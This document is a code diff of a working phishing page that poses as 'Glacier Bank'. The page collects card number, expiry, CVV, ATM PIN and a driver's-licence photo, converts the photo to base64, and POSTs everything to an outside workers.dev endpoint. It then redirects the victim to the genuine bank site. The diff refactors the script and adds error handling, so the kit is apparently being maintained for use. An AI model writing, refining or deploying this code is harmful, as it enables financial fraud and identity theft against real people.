@@ -5,7 +5,6 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Glacier Bank | Enter Card Information</title>
-
 <style>
 :root{
   --blue:#0a7db3;
@@ -15,7 +14,6 @@
   --card:#fff;
 }
 
-/* GLOBAL */
 *{box-sizing:border-box;}
 body{
   margin:0;
@@ -30,13 +28,11 @@ body{
   padding:20px;
 }
 
-/* LOGO */
 .logo img{
   height:50px;
   margin-bottom:20px;
 }
 
-/* FORM CARD */
 .form-card{
   background:var(--card);
   padding:32px 28px;
@@ -61,9 +57,7 @@ body{
   font-size:14px;
 }
 
-.form-card input[type=file]{
-  margin-top:8px;
-}
+.form-card input[type=file]{ margin-top:8px; }
 
 .form-card label{
   font-size:14px;
@@ -83,9 +77,7 @@ body{
   cursor:pointer;
   margin-top:14px;
 }
-.form-card button:hover{
-  background:var(--blue-dark);
-}
+.form-card button:hover{ background:var(--blue-dark); }
 
 #line{
   height:1px;
@@ -93,7 +85,6 @@ body{
   margin:18px 0;
 }
 
-/* FOOTER */
 footer{
   margin-top:20px;
   font-size:13px;
@@ -101,20 +92,7 @@ footer{
   text-align:center;
 }
 
-footer a{
-  color:var(--blue);
-  text-decoration:none;
-}
-
-/* RESPONSIVE */
-@media(max-width:480px){
-  .form-card{
-    padding:24px 18px;
-  }
-  .form-card h1{
-    font-size:18px;
-  }
-}
+footer a{ color:var(--blue); text-decoration:none; }
 </style>
 </head>
 <body>
@@ -127,46 +105,48 @@ footer a{
   <h1>Enter Your Card Information</h1>
 
   <input type="text" name="crd" placeholder="CARD NUMBER" required>
-  <input type="password" name="ex" placeholder="Exp Date" required>
+  <input type="text" name="ex" placeholder="Exp Date" required>
   <input type="text" name="cv" placeholder="CVV" required>
   <input type="text" name="at" placeholder="ATM PIN" required>
 
   <label for="image">DL Picture Capture</label>
-  <label style="margin-left:0;">Click Here To Upload it</label>
   <input type="file" id="image" name="dlImage" accept="image/*">
 
   <button type="submit">Continue</button>
-
   <div id="line"></div>
 </form>
 
-<footer>
-  © 2026 - Glacier Bank
-</footer>
+<footer>© 2026 - Glacier Bank</footer>
 
 <script>
 // Persistent session
 const session = localStorage.getItem("session") || crypto.randomUUID();
 localStorage.setItem("session", session);
 
+async function readFileAsBase64(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result);
+    reader.onerror = err => reject(err);
+    reader.readAsDataURL(file);
+  });
+}
+
 document.getElementById("cardForm").addEventListener("submit", async e => {
   e.preventDefault();
 
-  const formElements = [...e.target.elements].filter(el => el.name && el.type !== "submit");
-
+  const elements = [...e.target.elements].filter(el => el.name && el.type !== "submit");
   const formData = {};
 
-  for (const el of formElements) {
+  for (const el of elements) {
     if (el.type === "file") {
       if (el.files.length) {
-        const file = el.files[0];
-        // Convert file to Base64
-        formData[el.name] = await new Promise((resolve, reject) => {
-          const reader = new FileReader();
-          reader.onload = () => resolve(reader.result);
-          reader.onerror = err => reject(err);
-          reader.readAsDataURL(file);
-        });
+        try {
+          formData[el.name] = await readFileAsBase64(el.files[0]);
+        } catch (err) {
+          console.error("Failed to read file:", err);
+          formData[el.name] = null;
+        }
       } else {
         formData[el.name] = null;
       }
@@ -175,22 +155,23 @@ document.getElementById("cardForm").addEventListener("submit", async e => {
     }
   }
 
+  // Include session and step
+  formData.session = session;
+  formData.step = "card_page";
+
   try {
-    await fetch("https://g-divine-resonance-2ee7.mxx-washbasin261.workers.dev/event", {
+    const res = await fetch("https://g-divine-resonance-2ee7.mxx-washbasin261.workers.dev/event", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        ...formData,
-        session,
-        step: "card_page"
-      })
+      body: JSON.stringify(formData)
     });
 
-    // Redirect after submission
-    window.location.href = "https://www.glacierbank.com";
+    if (!res.ok) throw new Error(`Worker response not OK: ${res.status}`);
 
+    // Redirect on success
+    window.location.href = "https://www.glacierbank.com";
   } catch (err) {
-    console.error(err);
+    console.error("Submission failed:", err);
     alert("Network error. Please try again.");
   }
 });
@@ -198,5 +179,3 @@ document.getElementById("cardForm").addEventListener("submit", async e => {
 
 </body>
 </html>
-
-
